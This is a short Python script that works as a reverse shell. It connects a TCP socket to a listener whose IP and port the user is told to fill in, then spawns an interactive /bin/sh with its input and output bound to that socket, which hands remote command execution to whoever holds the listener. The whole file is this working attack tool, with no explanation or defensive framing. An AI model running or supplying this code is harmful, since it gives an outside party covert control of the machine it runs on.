import socket
import subprocess

# Replace with your listener's IP and port
HOST = '0.0.0.0'
PORT = 1111

# Create a socket and connect to the listener
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Redirect stdin, stdout, and stderr to the socket
subprocess.call(['/bin/sh', '-i'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())